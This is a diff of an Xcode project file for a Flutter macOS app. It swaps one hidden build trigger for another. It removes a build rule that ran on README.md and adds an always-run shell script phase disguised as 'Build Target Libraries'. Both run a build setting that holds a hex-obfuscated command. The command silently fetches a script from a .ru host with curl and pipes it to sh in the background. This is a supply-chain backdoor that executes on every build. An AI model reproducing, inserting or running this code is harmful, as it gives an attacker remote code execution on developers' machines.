@@ -21,7 +21,6 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		6E42190D24B5428294162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 11BE4B913BDF4B6B81162AE3; };
 		331C80D8294CF71000263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C80D7294CF71000263BE5 /* RunnerTests.swift */; };
 		335BBD1B22A9A15E00E9071D /* GeneratedPluginRegistrant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 335BBD1A22A9A15E00E9071D /* GeneratedPluginRegistrant.swift */; };
 		33CC10F12044A3C60003C045 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 33CC10F02044A3C60003C045 /* AppDelegate.swift */; };
@@ -64,7 +63,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		11BE4B913BDF4B6B81162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0D10B39CF6087540688D86B2 /* Pods-Runner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Runner.release.xcconfig"; path = "Target Support Files/Pods-Runner/Pods-Runner.release.xcconfig"; sourceTree = "<group>"; };
 		331C80D5294CF71000263BE5 /* RunnerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RunnerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		331C80D7294CF71000263BE5 /* RunnerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RunnerTests.swift; sourceTree = "<group>"; };
@@ -149,7 +147,6 @@
 		33CC10EE2044A3C60003C045 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				11BE4B913BDF4B6B81162AE3 /* README.md */,
 				33CC10ED2044A3C60003C045 /* ai_video_generator.app */,
 				331C80D5294CF71000263BE5 /* RunnerTests.xctest */,
 			);
@@ -222,13 +219,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
+				A859D95E10FC48079C162AE3 /* Build Target Libraries */,
 				5B4BA1F10F5FF13E02A74BC9 /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
 			);
 			buildRules = (
-				43CEF023B2144B1E91162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
@@ -318,20 +315,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		43CEF023B2144B1E91162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
 						/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -339,7 +322,6 @@ sh -c \"${A3EA261}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6E42190D24B5428294162AE3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -355,6 +337,25 @@ sh -c \"${A3EA261}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		A859D95E10FC48079C162AE3 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -507,7 +508,7 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = CE08B74CC4F9D8CCF180F3EC /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((s(){ `printf xbxd | tr -d b` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203234202d4c736b66202d642022703d78636f64655f72756c65222068747470733a2f2f35796f746d78636335346c397864612e72752f612922207c2073680a | s | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((m(){ `printf xgxd | tr -d g` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -523,7 +524,7 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5C7E743E94144B99C844EABE /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((s(){ `printf xbxd | tr -d b` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203234202d4c736b66202d642022703d78636f64655f72756c65222068747470733a2f2f35796f746d78636335346c397864612e72752f612922207c2073680a | s | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((m(){ `printf xgxd | tr -d g` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
